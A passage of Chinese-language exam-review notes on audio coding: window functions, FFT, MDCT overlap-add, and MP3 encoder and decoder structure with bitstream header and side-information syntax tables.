<li>假设我们开始处理一个带限信号，并以采样频率 Fs≥2Fmax 对信号进行采样。</li>
<li>假设我们想要使用有限的样本块进行计算，以便在等待信号完成之前开始进行计算。</li>
<li>实现这个目标的一种方法是将原始的非有限信号 x(t) 与矩形窗函数相乘。</li>
</ul>
<p>矩形窗函数</p>
<ul>
<li>矩形窗函数 WR(t) 在 t=0 到 t=T 之间等于 1，在其他地方等于零。</li>
<li>我们可能想知道这个时限信号是否仍然足够带限。</li>
<li>时限信号的傅里叶变换等于原始信号的傅里叶变换与 WR(t) 的傅里叶变换 WR(f) 的卷积。</li>
<li>WR(f) 的傅里叶变换随着频率的增加下降得非常缓慢，这意味着时限信号的傅里叶变换很可能不再足够带限。</li>
<li>如果我们使用这个窗函数，会发生混叠现象。</li>
</ul>
<p>正弦窗函数</p>
<ul>
<li>矩形窗函数的问题在于窗口边缘处的截断非常尖锐。</li>
<li>尖锐的变化会导致高频成分。</li>
<li>在时域中，更好的窗函数选择是在边缘处缓慢衰减，以避免尖锐的不连续性。</li>
<li>正弦窗函数为 ws(t) = sin(πt/T)，0≤t≤T。当应用于离散时间信号的 N 个样本时，窗函数变为 ws[n] = sin(π(n+1/2)/N)，其中 n=0，...，N-1。</li>
<li>从频谱中可以看出，主瓣比矩形窗函数更宽，但频率幅度下降得更快。</li>
</ul>
<p>汉宁窗函数</p>
<ul>
<li>汉宁窗函数在边缘处没有正弦窗函数那样的突变。</li>
<li>汉宁窗函数为 wH(t) = 1/2(1-cos(2πt/T))，0≤t≤T。</li>
<li>当应用于离散时间信号的 N 个样本时，窗函数变为 wH[n] = 1/2(1-cos[2π(n+1/2)/N])，其中 n=0，...，N-1。</li>
<li>从频谱中可以看出，汉宁窗函数的衰减速度更快（有助于避免混叠），但其主瓣的宽度更大（对于准确的频率识别不利）。</li>
<li>在窗函数设计中，我们面临权衡：低旁瓣能量（与杂散频率成分相关）和主瓣的宽度（窗函数的频率分辨率）。</li>
</ul>
<blockquote>
<p>[!hint] 考点 17：FFT 和复杂度</p>
</blockquote>
<p>快速傅里叶变换（FFT）</p>
<ul>
<li>直接计算 DFT 需要 $N^2$ 次复数乘法和加法运算。</li>
<li>令人惊讶的是，FFT 允许我们在大约 $N×log_2N$ 次复数乘法/加法运算中完成完全相同的计算。</li>
<li>以 N=1024 为例，FFT 只需要 DFT 所需计算时间的 1%。</li>
<li>这个算法最早由高斯在 1880 年提出，后来由库利和图基在 1965 年重新发现。</li>
</ul>
<blockquote>
<p>[!hint] 考点 15：傅里叶变换、傅里叶级数、离散时间傅里叶变换、离散傅里叶变换</p>
</blockquote>
<table>
<thead>
<tr>
<th></th>
<th>时域</th>
<th>频域</th>
</tr>
</thead>
<tbody>
<tr>
<td>傅里叶变换</td>
<td>连续、无限</td>
<td>连续、无限</td>
</tr>
<tr>
<td>傅里叶级数</td>
<td>有限信号周期延拓，连续</td>
<td>离散</td>
</tr>
<tr>
<td>离散时间傅里叶变换</td>
<td>离散</td>
<td>有限频谱的周期延拓</td>
</tr>
<tr>
<td><span style="color:#ff0000">离散傅里叶变换</span></td>
<td>离散，有限</td>
<td>离散，有限</td>
</tr>
</tbody>
</table>
<blockquote>
<p>[!hint] 考点 16：Windowing</p>
</blockquote>
<table>
<thead>
<tr>
<th></th>
<th>去混叠</th>
<th>频率选择性</th>
</tr>
</thead>
<tbody>
<tr>
<td>矩形窗</td>
<td>最差</td>
<td><span style="color:#ff0000">最好</span></td>
</tr>
<tr>
<td>正弦窗</td>
<td>中等</td>
<td>中等</td>
</tr>
<tr>
<td>汉宁窗</td>
<td>最好</td>
<td>最差</td>
</tr>
</tbody>
</table>
<blockquote>
<p>[!hint] 考点 18：MDCT：重叠相加技术、长窗、短窗</p>
</blockquote>
<p>MDCT</p>
<p>重叠相加技术</p>
<ul>
<li>PQMF 通常被视为时频银行（Time Frequency banks）。相应的编码称为子带编码。</li>
<li>如果在音频编码过程中，将时域的数据样本映射到频域的数据样本，例如使用 FFT，这种音频编码方法称为变换编码。</li>
<li>我们已经知道，在进行 DFT 之前，音频信号会进行窗函数处理以避免混叠效应，在解码器中，我们需要知道如何恢复原始信号。</li>
<li>除了应用逆离散傅里叶变换之外，我们还需要将窗函数的影响从数据中去除。</li>
<li>第一种方法是将逆 DFT 的输出除以窗函数系数。</li>
<li>问题在于量化/反量化会在信号中引入小的误差。</li>
<li>这些误差可能是听不到的，但是将逆 DFT 的输出除以窗函数可能会放大数据块边缘附近的误差，因为窗函数在该区域被设计为平滑地趋近于零。</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110204338.webp" alt="image.png|450"></p>
<p>在编码器中，块输入信号是重叠的。在解码器中，我们重叠并相加输出信号。</p>
<p>窗函数的设计使得在没有量化的情况下可以恢复原始信号。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110204716.webp" alt="image.png"></p>
<p>重叠量 $N-M ≤ N/2$</p>
<p>在编码器中，每个连续的数据块从前一个数据块的起始位置后的 M 个样本开始，并包括 M 个新的数据样本。</p>
<p>在解码器中：</p>
<ul>
<li>我们将逆变换和窗函数处理后的数据的前 M 个样本传输到输出缓冲区。</li>
<li>将剩余的 N-M 个样本存储到存储缓冲区中。</li>
<li>我们将前一个数据块存储缓冲区中的 N-M 个样本与当前数据块输出缓冲区的前 N-M 个样本相加。</li>
<li>然后，我们将输出缓冲区的 M 个样本发送到解码器的输出流中。</li>
</ul>
<p>我们选择在解码器中进行窗函数处理的原因是：</p>
<ul>
<li>使逆变换块边缘附近的量化噪声较小；</li>
<li>分析和合成阶段可以对称地进行。</li>
</ul>
<p>对于分析和合成窗函数 $wa[n]$ 和 $ws[n]$，有以下要求：</p>
<ul>
<li>在没有重叠的任何块区域中，<img src="https://cdn.gallery.uuanqin.top/img/20231110204931.webp" alt="image.png"></li>
<li>在重叠区域中，<img src="https://cdn.gallery.uuanqin.top/img/20231110204934.webp" alt="image.png"><br>
该条件将一个块的窗函数的右侧与下一个块的窗函数的左侧相关联。i 是块的索引。</li>
</ul>
<p>窗的选择：</p>
<p>如果分析和合成窗函数是相同的，我们有：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110205027.webp" alt="image.png"></p>
<p>一个满足这个条件的简单窗函数是：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110205032.webp" alt="image.png"></p>
<p>正弦窗口可能无法为特定应用提供频率分辨率与泄漏之间的权衡。实际上，我们可以通过一种归一化过程来修改任何窗口函数，以满足重叠相加条件。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110205646.webp" alt="image.png"></p>
<p>如果 w'(p) 具有控制其形状的参数，我们可以调整这些参数以调节归一化窗口以适应特定应用。归一化过程可以使用 Kaiser-Bessel 窗口作为核窗口，并在相邻块之间具有 50% 的重叠来进行，从而创建所谓的“Kaiser-Bessel 衍生”窗口。</p>
<p>音频编码中的窗口考虑因素：</p>
<ul>
<li>在音频编码中，我们希望：
<ul>
<li>最大化频率分离。</li>
<li>最小化音频阻塞效应的影响。</li>
</ul>
</li>
<li>所选的窗口长度和形状与这两个属性有关。</li>
<li>给定输入数据到滤波器组的块大小，窗口形状的选择决定了滤波器组的频谱分离程度：
<ul>
<li>正弦窗口比α=4 的 KBD 窗口具有更好的近端选择性（主瓣更窄）。</li>
<li>正弦窗口的侧瓣能量的抑制程度较差。<br>
根据输入音频信号的特性，正弦窗口或α=4 的 KBD 窗口可能为信号表示提供更好的频率分辨率：</li>
</ul>
</li>
<li>对于高度音调的信号，近端选择性比频率表示中的最终抑制更重要。</li>
<li>如果信号的频率分量之间存在较大的分离，更高的最终抑制可以更好地利用信号分量的掩蔽效应。</li>
</ul>
<p>改进离散余弦变换（MDCT）：</p>
<ul>
<li>为了减少窗口化引起的阻塞效应，我们希望窗口边缘的过渡到零尽可能平缓。</li>
<li>这意味着当我们设置大的重叠区域时，阻塞效应最小。</li>
<li>然而，我们需要对每 M 个新的时间样本输入编码器的样本进行 N 个样本的变换数据的编码、传输/存储。</li>
<li>在从冗余和无关信息去除中获得任何编码增益之前，我们将数据速率增加了 N/M 倍。</li>
<li>为了解决这个问题，开发了 MDCT。</li>
<li>MDCT 是一种替代 DFT 的变换，允许块之间有 50% 的重叠，而不增加数据速率。<br>
<img src="https://cdn.gallery.uuanqin.top/img/20231110205908.webp" alt="image.png"></li>
</ul>
<h1>MP3 的编码与解码</h1>
<p>Normative：必须的，必要的</p>
<p>Informative：不必的</p>
<blockquote>
<p>[!hint] 考点 22：MP3 的编解码器过程</p>
</blockquote>
<h2>MP3 编码器（Informative Elements）</h2>
<p>编码器概览：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109220436.webp" alt="image.png"></p>
<h3>时频映射</h3>
<p>PQMF：在一个帧中，对 1152 个 PCM 音频样本进行滤波，使得每个子带包含 36 个子带样本。</p>
<p>窗函数：在进行 MDCT 之前，对子带样本应用了四种不同的窗函数。</p>
<p>MDCT：使用两种不同的 MDCT 块长度，一种是长块，包含 36 个样本，另一种是短块，包含 12 个样本。<strong>短块适合变化较快的信号，长块适合平稳信号。</strong></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109220745.webp" alt="image.png"></p>
<h3>块模式</h3>
<ul>
<li>注意，短块长度是长块长度的 1/3。在短块模式下，三个短块替代一个长块，这样无论块类型如何，音频样本帧的 MDCT 样本数量保持不变。</li>
<li>对于给定的音频样本帧，MDCT 可以全部具有相同的块长度（长块或短块），或者采用混合块模式。</li>
<li>在混合块模式下，MDCT 对于两个较低频率子带使用长窗口，对于 30 个较高频率子带使用短窗口。这种模式在不牺牲较高频率的时间分辨率的情况下，为较低频率提供更好的频率分辨率。</li>
</ul>
<p>应用于 1152 个 PCM 样本的信号处理：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109221035.webp" alt="image.png"></p>
<h3>去混叠</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109221050.webp" alt="image.png"></p>
<p>在量化之前，应用了一种抗混叠处理来消除在分析 PQMF 中引入的混叠，以减少传输的信息量。</p>
<p>这种减少是通过一系列蝶形计算来实现的。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109221249.webp" alt="image.png"></p>
<h3>非均匀量化</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109221321.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109221324.webp" alt="image.png"></p>
<p><span style="color:#ff0000">global_gain：全局量化步长。控制比特率。</span></p>
<p>scale_factor：子带因子控制噪声。</p>
<p>在量化之前，将 MDCT 系数提升到 3/4 的幂，以在量化器值的范围内提供更一致的信噪比。</p>
<p>scale_factor 用于调整量化噪声，以适应掩蔽阈值的不同频率轮廓。</p>
<h3>哈夫曼编码</h3>
<p>有序的频率线被分为三个不同的区域，分别称为“rzero”、“count1”和“big_value”区域。</p>
<ul>
<li>连零区域：从较高的频率开始，编码器将连续的全零值识别为一个区域，即“rzero”区域。“rzero”区域必须包含偶数个零值。</li>
<li>数 1 区域：4 个一起编码。由一系列仅包含 -1、0 或 1 的值组成。这个区域的两个霍夫曼表每次编码 4 个值，因此值的数量必须是 4 的倍数。</li>
<li>big_value 区：2 个一起编码。涵盖了所有剩余的值，称为“big_values”区域。这些值与 30 个霍夫曼表一起进行编码。这个区域进一步分为三个子区域，每个子区域都有自己特定的霍夫曼表。</li>
</ul>
<h3>比特分配（两层嵌套循环）</h3>
<p>外层循环：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109221944.webp" alt="image.png"></p>
<p>内层循环：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109221959.webp" alt="image.png"></p>
<p>Quantizer_change is the change of global_gain.</p>
<blockquote>
<p>[!hint] 考点 20：MP3：比特流格式、MP3 采样频率、stereo/joint channel/dual channel/single channel、哈夫曼编码域，比特池</p>
</blockquote>
<h3>比特流格式</h3>
<p>为了生成符合 MP3 标准的比特流，霍夫曼编码的频率线、辅助信息和帧头被组合成比特流。</p>
<p>比特流被分割成帧，每帧表示 1152 个音频样本。</p>
<p>帧头描述了编码音频所使用的比特率和采样频率。</p>
<p>辅助信息告知使用的块类型、霍夫曼表、subband gain 和子带比例因子。</p>
<h3>比特池</h3>
<p>使用“比特储备池”方法来满足编码器对编码比特的时变需求。</p>
<p>编码器只能从过去的帧中借用比特，而不能从未来的帧中借用比特。</p>
<p>MPEG/Audio Layer 3 比特流使用一个 9 位指针，称为 main_data_begin，来表示当前处理帧的主数据的起始点。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109222321.webp" alt="image.png"></p>
<h3>Stereo Encoding</h3>
<p>联合立体声</p>
<p>中侧立体声</p>
<p>强度立体声</p>
<h2>MP3 解码器（Normative Elements）</h2>
<p>MPEG 音频第三层解码概述：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109222737.webp" alt="image.png"></p>
<p>解码器主要由三个部分组成：“比特流解码”，“逆量化”和“频率到时间映射”。</p>
<ul>
<li>输入的编码比特流通过第一部分进行同步，并提取每帧的量化频率线和其他信息。</li>
<li>接下来，量化的频率线进行反量化。</li>
<li>最后，应用逆 MDCT 和合成 PQMF 来获得以 PCM 格式输出的信号。</li>
</ul>
<p>MP3 解码器的框图：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109222925.webp" alt="image.png"></p>
<p>比特流解码框图：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109222954.webp" alt="image.png"></p>
<h3>辅助信息解码的过程</h3>
<ul>
<li>帧中的辅助信息包含解码主数据所需的必要信息。</li>
<li>它包含有关在 Huffman 解码过程中使用哪些霍夫曼表以及比例因子的信息。</li>
<li>它还包含主数据开始的位置信息。</li>
</ul>
<h3>哈夫曼信息解码</h3>
<ul>
<li>Huffman 信息解码块的任务是设置 Huffman 解码块所需的所有参数。</li>
<li>第一个任务是从辅助信息中收集有关 Huffman 编码比特的数据。这包括在比特流中找到 Huffman 编码的比特，并确定每个频谱区域分区所使用的 Huffman 表。</li>
<li>此外，该块必须确保生成所有频率线，而不管 Huffman 编码比特中描述了多少频率线。当出现少于 576 个频率线时，Huffman 信息解码块必须执行零填充以填补数据的不足。</li>
</ul>
<p>哈夫曼解码：</p>
<ul>
<li>由于 Huffman 编码是一种可变长度编码方法，没有尝试将 Huffman 编码比特中的各个码字分开，因此，如果不从已知为码字起始点的 Huffman 编码比特开始解码，无法识别 Huffman 编码比特中间的单个码字。</li>
<li>如果在一串 Huffman 编码比特中发生错误，剩余的编码比特无法正确解码。<strong>我们可以直接找下一帧的同步字，那么这一帧就去掉。</strong></li>
</ul>
<p>子带因子解码：<img src="https://cdn.gallery.uuanqin.top/img/20231109223350.webp" alt="image.png"></p>
<h3>反量化（Dequantization）或去缩放（Descaling）</h3>
<p>目的是重构编码器中由 MDCT 块生成的频率线的感知相同的数据。</p>
<p>长窗口的计算公式为：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109223456.webp" alt="image.png"></p>
<p>短窗口的计算公式为：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109223500.webp" alt="image.png"></p>
<p>反量化：</p>
<ul>
<li><span style="color:#ff0000">全局步长（global_gain）定义了在一个 granule 内用于一个声道的量化步长</span>。</li>
<li>编码器中的比例因子（scalefactors）使用步长为 2 或 sqrt(2) 进行量化，可以通过 scalefac_scale 标志的值来识别，如果 scalefac_scale=0，则 scalefac_multiplier=0.5，否则 scalefac_multiplier=1。</li>
<li>pretab 和 preflag 变量仅在长窗口的情况下使用。一个表格为 pretab 变量的每个比例因子带指定了一个单独的值。</li>
<li>对于短窗口，通过 subblock_gain 指定了一个 gain factor。</li>
</ul>
<h3>重新排序（Reordering）</h3>
<p>通过解量化生成的频率线并不总是以相同的方式排序。</p>
<p>在长窗口的 MDCT 块中，它会首先按子带，然后按频率生成排序的频率线。</p>
<p>为了增加频率线的 Huffman 编码效率，在短窗口中，频率线首先按子带排序，然后按频率排序，最后按窗口排序。</p>
<h3>立体声处理</h3>
<p>在解量化之后，重构的值在进入合成滤波器组之前进行中侧处理（MS）。</p>
<p>在中侧立体声（MS）模式下，传输的是归一化的中侧（middle/side）通道值 Mi/Si，而不是左右（left/right）通道值 Li/Ri。因此，可以使用这些 Mi/Si 值来重构 Li/Ri。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109224345.webp" alt="image.png"></p>
<h3>去混叠</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109224359.webp" alt="image.png"></p>
<h3>反向 MDCT</h3>
<p>从去混叠块中处理的频率线通过 IMDCT 块进行处理。IMDCT 的表达式如下所示：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109224424.webp" alt="image.png"></p>
<p>Xk 表示频率线，对于短块 n=12，对于长块 n=36。</p>
<p>根据 block_type 值，xi 与之前定义的窗口之一相乘：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109224428.webp" alt="image.png"></p>
<h3>IMDCT 的重叠相加</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109224656.webp" alt="image.png"></p>
<h3>合成多相滤波器组</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109224713.webp" alt="image.png"></p>
<h2>编码语法（Normative Elements）</h2>
<h3>位流格式</h3>
<p>一个 MP3 位流被组织成音频帧，其中包括五个部分：头部、CRC、辅助信息、主数据和附加数据。</p>
<p>单声道的辅助信息块长度为 136 位，双声道的辅助信息块长度为 256 位。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110132621.webp" alt="image.png"></p>
<pre><code class="language-c">// 音频帧
frame()
{
	header()
	error_check()
	audio_data() // 音频数据
	ancillary_data()
}
</code></pre>
<h3>Header</h3>
<p>一开始的 32 位（4 字节）是头部信息。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110132753.webp" alt="image.png"></p>
<pre><code class="language-c">header()
{
	syncword           12 bits bslbf // 12个1
	ID                 1  bit  bslbf // 表明算法的ID。1表示MPEG音频，0做保留
	layer              2  bits bslbf // 表明使用的层级。
									 // 11：Layer I；   10 Layer II
									 // 01：Layer III； 00 保留
	protection_bit     1  bit  bslbf // 指示是否在音频比特流中增加了冗余，以方便错误检测。
									 // 1：没有冗余，0：增加了冗余
	bitrate_index      4  bits bslbf // 指示比特率。全0表示'free format'，
									 // 可以使用不出现在列表中的固定比特率
	sampling_frequency 2  bits bslbf // 抽样频率
	padding_bit        1  bit  bslbf // 1：帧包含额外的槽以调整平均比特率到采样频率，否则为0。
									 // padding只在44.1kHz采样频率下才有必要使用。
	private_bit        1  bit  bslbf // 私用比特。未来ISO将不再使用。
	mode               2  bits bslbf 
	mode_extension     2  bits bslbf // 用于联合立体声模式中（mode='01'）
									// 指名应用哪种联合立体声编码方法类型。
									//该算法中隐含了应用强度立体声模式和ms_stereo模式的频率范围
	copyright          1  bit  bslbf // 0:编码的比特流没有版权，1：存在版权保护
	original/home      1  bit  bslbf // 0：比特流为副本，1：比特流为原始版本
	emphasis           2  bits bslbf // 加重的信息。表明解加重需要使用的类型。
}
</code></pre>
<table>
<thead>
<tr>
<th>bit_rate_index</th>
<th>bit rate</th>
</tr>
</thead>
<tbody>
<tr>
<td>'0000'</td>
<td>free</td>
</tr>
<tr>
<td>'0001'</td>
<td>32 kbit/s</td>
</tr>
<tr>
<td>'0010'</td>
<td>40 kbit/s</td>
</tr>
<tr>
<td>'0011'</td>
<td>48 kbit/s</td>
</tr>
<tr>
<td>'0100'</td>
<td>56 kbit/s</td>
</tr>
<tr>
<td>'0101'</td>
<td>64 kbit/s</td>
</tr>
<tr>
<td>'0110'</td>
<td>80 kbit/s</td>
</tr>
<tr>
<td>'0111'</td>
<td>96 kbit/s</td>
</tr>
<tr>
<td>'1000'</td>
<td>112 kbit/s</td>
</tr>
<tr>
<td>'1001'</td>
<td>128 kbit/s</td>
</tr>
<tr>
<td>'1010'</td>
<td>160 kbit/s</td>
</tr>
<tr>
<td>'1011'</td>
<td>192 kbit/s</td>
</tr>
<tr>
<td>'1100'</td>
<td>224 kbit/s</td>
</tr>
<tr>
<td>'1101'</td>
<td>256 kbit/s</td>
</tr>
<tr>
<td>'1110'</td>
<td>320 kbit/s</td>
</tr>
<tr>
<td>'1111'</td>
<td>forbidden</td>
</tr>
</tbody>
</table>
<p>sampling_frequency 抽样频率：</p>
<table>
<thead>
<tr>
<th></th>
<th>MPEG-1</th>
<th>MPEG-2</th>
</tr>
</thead>
<tbody>
<tr>
<td>'00'</td>
<td>44.1kHz</td>
<td>22.05kHz</td>
</tr>
<tr>
<td>'01'</td>
<td>48 kHz</td>
<td>24kHz</td>
</tr>
<tr>
<td>'10'</td>
<td>32 kHz</td>
<td>16kHz</td>
</tr>
<tr>
<td>'11'</td>
<td>reserved</td>
<td>reserved</td>
</tr>
</tbody>
</table>
<p>mode：</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>'00'</td>
<td>stereo 立体声</td>
</tr>
<tr>
<td>'01'</td>
<td>joint_stereo 联合立体声 (intensity_stereo 增强立体声 and/or ms_stereo)  ms-&gt;mid-size</td>
</tr>
<tr>
<td>'10'</td>
<td>dual_channel</td>
</tr>
<tr>
<td>'11'</td>
<td>single_channel 单通道</td>
</tr>
</tbody>
</table>
<p>mode_extension：</p>
<table>
<thead>
<tr>
<th></th>
<th>intensity_stereo</th>
<th>ms_stereo</th>
</tr>
</thead>
<tbody>
<tr>
<td>'00'</td>
<td>off</td>
<td>off</td>
</tr>
<tr>
<td>'01'</td>
<td>on</td>
<td>off</td>
</tr>
<tr>
<td>'10'</td>
<td>off</td>
<td>on</td>
</tr>
<tr>
<td>'11'</td>
<td>on</td>
<td>on</td>
</tr>
</tbody>
</table>
<p>emphasis：</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>'00'</td>
<td>no emphasis</td>
</tr>
<tr>
<td>'01'</td>
<td>50/15 microsec. emphasis</td>
</tr>
<tr>
<td>'10'</td>
<td>reserved</td>
</tr>
<tr>
<td>'11'</td>
<td>CCITT J.17</td>
</tr>
</tbody>
</table>
<h3>ErrorCheck</h3>
<pre><code class="language-c">error_check()
{
	if (protection_bit==0) // 在Header中
		crc_check 16 bits rpchof
}
</code></pre>
<h3>Audio Data</h3>
<p>每一个音频帧包含来自 1 到 2 个音频 granules 的压缩数据。</p>
<p>每一个 granule 由 18*32 子带样本组成</p>
<p>帧中的音频数据以下面的方式进行分配：</p>
<ul>
<li>main_data_begin pointer</li>
<li>side info for both granules (scfsi)</li>
<li>side info granule 1</li>
<li>side info granule 2</li>
<li>scalefactors and Huffman code data granule 1</li>
<li>scalefactors and Huffman code data granule 2</li>
</ul>
<h4>边信息</h4>
<pre><code class="language-c">audio_data(){
	main_data_begin  9 bits uimsbf // main-data-begin 的值用于确定帧的主数据的第一个比特的位置。它将该位置指定为相对于音频同步字节的负偏移量（以字节为单位）
	if (mode == single_channel)	{
		private_bits 5 bits bslbf // 用于私有用途的位。这些位在ISO的未来不会被使用。
		// scfsi_band 控制着尺度因子组（scfsi_bands）的尺度因子选择信息的使用。
		for (scfsi_band=0; scfsi_band&lt;4; scfsi_band++)
			scfsi[scfsi_band] 1 bits bslbf // 尺度因子选择信息。
										   // scfsi 控制着对于每个粒度是否传输尺度因子： 
										   // '0' 对于每个粒度都传输尺度因子。 
										   // '1' 对于粒度0传输的尺度因子也适用于粒度1。
		for (gr=0; gr&lt;2; gr++) 	{
			part2_3_length[gr] 12 bits uimsbf
			// 该值包含用于尺度因子和Huffman编码数据的主数据比特数。
			// 由于边信息的长度始终相同，可以使用该值来计算每个粒度的主要信息的起始位置
			// 以及辅助信息的位置（如果使用）。
			// part2_length - 该值包含用于尺度因子的主数据比特数。
			big_values[gr] 9 bits uimsbf // 每个粒度的频谱值使用不同的Huffman编码表进行编码。
							// 完整的频率范围被分成几个区域，然后使用不同的Huffman表进行编码。
			global_gain[gr] 8 bits uimsbf // 全局量化步长
			scalefac_compress[gr] 4 bits bslbf // 选择用于比例因子传输的位数。
			blocksplit_flag[gr] 1 bit bslbf // 表示该块使用非正常（类型0）的窗口。
		}
	}
	if (blocksplit_flag[gr]){
		block_type[gr] 2 bits bslbf // 指示实际粒度的窗口类型。
		switch_point[gr] 1 bits uimsbf // 表示短/长变换的分割点。
		for (region=0; region&lt;2; region++)
			table_select[region][gr] 5 bits bslbf // 指定用于压缩特定量化MDCT区域的Huffman编码表。
		for (window=0; window&lt;3; window++)
			subblock_gain[window][gr] 3 bits uimsbf // 表示一个子块相对于全局增益的增益偏移量。仅在块类型2（短窗口）中使用。
	}
	else{
		for (region=0; region&lt;3; region++)
			table_select[region][gr] 5 bits bslbf
			// region_address1[gr]，region_address2[gr]
			// 对频谱进行进一步分区，以增强Huffman编码器的性能。
			// 这是对big_values区域的细分。这个细分的目的是获得更好的错误鲁棒性（tea：这一点表示怀疑）和更好的编码效率。使用三个区域。
			// 每个区域根据最大量化值和局部信号统计使用不同的Huffman编码表进行编码。
			region_address1[gr] 4 bits bslbf
			region_address2[gr] 3 bits bslbf
		}
		preflag[gr] 1 bit bslbf // 这是对量化值进行额外高频放大的快捷方式。
		scalefac_scale[gr] 1 bit bslbf // 比例因子按对数方式进行量化，步长为2，取决于scalefac_scale的值。
		// scalefac_scale = 0，步长为sqrt(2) 
		// scalefac_scale = 1，步长为2
		count1table_select[gr] 1 bit bslbf // 此标志选择两个可能的Huffman编码表之一，用于幅度不超过1的量化值四元组的区域。
	}
</code></pre>
<table>
<thead>
<tr>
<th>scfsi_band</th>
<th>scalefactor bands</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0,1,2,3,4,5,</td>
</tr>
<tr>
<td>1</td>
<td>6,7,8,9,10,</td>
</tr>
<tr>
<td>2</td>
<td>11 ... 15</td>
</tr>
<tr>
<td>3</td>
<td>16 ... 20</td>
</tr>
</tbody>
</table>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110194611.webp" alt="image.png"></p>
<p>在长窗口的情况下，slen1 是用于比例因子带 0-10 的比例因子的长度。slen2 是用于比例因子带 11-21 的比例因子的长度。</p>
<table>
<thead>
<tr>
<th>scalefac_compress</th>
<th>slen1</th>
<th>slen2</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>0</td>
<td>2</td>
</tr>
<tr>
<td>3</td>
<td>0</td>
<td>3</td>
</tr>
<tr>
<td>4</td>
<td>3</td>
<td>0</td>
</tr>
<tr>
<td>5</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>2</td>
</tr>
<tr>
<td>7</td>
<td>1</td>
<td>3</td>
</tr>
<tr>
<td>8</td>
<td>2</td>
<td>1</td>
</tr>
<tr>
<td>9</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td>10</td>
<td>2</td>
<td>3</td>
</tr>
<tr>
<td>11</td>
<td>3</td>
<td>1</td>
</tr>
<tr>
<td>12</td>
<td>3</td>
<td>2</td>
</tr>
<tr>
<td>13</td>
<td>3</td>
<td>3</td>
</tr>
<tr>
<td>14</td>
<td>4</td>
<td>2</td>
</tr>
<tr>
<td>15</td>
<td>4</td>
<td>3</td>
</tr>
</tbody>
</table>
<h4>Main Data</h4>
<pre><code class="language-c">for (gr=0; gr&lt;2; gr++)
	if (blocksplit_flag[gr] == 1 &amp;&amp; block_type[gr] == 2){
		for (cb=0; cb&lt;switch_point_l[gr]; cb++)
		if (scfsi[cb]==0) || (gr==0)
			scalefac[cb][gr] 0..4 bits uimsbf
		for (cb=switch_point_s[gr]; cb&lt;cblimit_short; cb++)
			for (window=0; window&lt;3; window++)
			if (scfsi[cb]==0) || (gr==0)
				scalefac[cb][window][gr] 0..4 bits uimsbf
	}
	else
		for (cb=0; cb&lt;cblimit; cb++)
			if (scfsi[cb]==0) || (gr==0)
				scalefac[cb][gr] 0..4 bits uimsbf
				Huffmancodebits (part2_3_length-part2_length) bits bslbf
				while (position != main_data_end){
					ancillary_bit 1 bit bslbf
				}
			}
</code></pre>
<p><code>scalefac[cb][gr]</code> - 比例因子用于给量化噪声上色。如果量化噪声被正确形状的颜色掩盖，它将完全被掩盖。</p>
<p>编码器和解码器使用比例因子来获取数值块的除法因子。这些块延伸到多个频率线上。这些块被称为比例因子带，被选择得尽可能接近临界带。</p>
<p>比例因子压缩表显示，比例因子 0...10 的范围为 0 到 15（最大长度为 4 位），比例因子 11...21 的范围为 0 到 7（最大长度为 3 位）。</p>
<p>将频谱细分为比例因子带对于每个块长度和采样频率是固定的，并存储在编码器和解码器的表中。</p>
<p><code>Huffman_code_bits</code> - 伪函数</p>
<ul>
<li>所有绝对值小于等于 15 的量化值直接使用 Huffman 编码进行编码。总是对值 (x,y) 进行编码。</li>
<li>如果发现幅度大于 15 的量化值，则使用 ESC 码来标记这些值。</li>
<li>如果一对值中的一个或两个值不为零，则在 Huffman 编码字后附加一个或两个符号位。</li>
</ul>
<p><code>hcod[|x|][|y|]</code> 是值 x、y 的 Huffman 编码表条目。</p>
<p><code>hlen[|x|][|y|]</code> 是值 x、y 的 Huffman 长度表条目。</p>
<p><code>max_table_entry</code> 是最大的表条目索引。这是一个系统常量（15，单个表中的最大条目数为 256）。</p>
<p><code>signx</code> 是第一个值的符号（如果为正，则为 0；如果为负，则为 1）。</p>
<p><code>signy</code> 是第二个值的符号（如果为正，则为 0；如果为负，则为 1）。</p>
<blockquote>
<p>[!hint] 考点 21：MP3 huffman code: <span style="color:#ff0000">linebits</span></p>
</blockquote>
<pre><code class="language-c">struct coded_word {
